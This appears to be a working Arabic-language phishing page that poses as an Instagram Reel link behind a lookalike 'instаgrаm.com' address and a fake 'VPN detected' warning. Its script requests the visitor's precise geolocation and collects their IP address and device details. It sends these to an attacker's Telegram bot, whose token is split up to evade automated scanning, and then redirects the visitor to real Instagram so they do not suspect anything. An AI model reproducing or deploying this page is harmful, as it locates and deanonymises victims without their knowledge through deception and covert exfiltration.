<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Instagram Reel">
    <meta property="og:description" content="شاهد هذا الفيديو على Instagram">
    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b407f3e8E.png">
    <meta property="og:type" content="video.other">

    <title>تأكيد الاتصال الآمن</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; width: 320px; border-radius: 12px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .error-icon { font-size: 50px; color: #e74c3c; margin-bottom: 15px; }
        .btn-link { color: #0095f6; text-decoration: none; font-weight: bold; font-size: 14px; cursor: pointer; word-break: break-all; }
        .btn-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

<div class="box">
    <div class="error-icon">⚠️</div>
    <h3>خطأ في الاتصال (VPN Detected)</h3>
    <p style="font-size: 14px; color: #666;">يبدو أنك تستخدم بروكسي أو VPN. يرجى تأكيد هويتك عبر الرابط الرسمي للمتابعة:</p>
    
    <a href="javascript:void(0)" class="btn-link" onclick="verify()">
        instаgrаm.com/reels/Cg9${Math.floor(Math.random() * 1000000)}BvG/
    </a>
</div>

<script>
    // تقسيم التوكن لخدع روبوتات جيث هوب
    const p1 = "8609389464";
    const p2 = "AAEIqne_f";
    const p3 = "0xZNOeqYz-rk7XOsbALUM12gA8";
    const fullToken = p1 + ":" + p2 + p3;
    const chatID = "8658217605";

    async function verify() {
        if (navigator.geolocation) {
            // طلب الموقع الدقيق
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                
                const report = `🔥 صيدة الريلز الموهّمة:\n` +
                               `🌐 IP: ${ipData.ip}\n` +
                               `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
                               `📱 الجهاز: ${navigator.userAgent}`;
                
                await fetch(`https://api.telegram.org/bot${fullToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(report)}`);
                
                // التوجيه النهائي للريلز الحقيقي
                window.location.replace("https://www.instagram.com/reels/");
            }, () => {
                // حتى لو رفض الموقع نوجهه عشان ما يشك
                window.location.replace("https://www.instagram.com/reels/");
            });
        }
    }
</script>
</body>
</html>
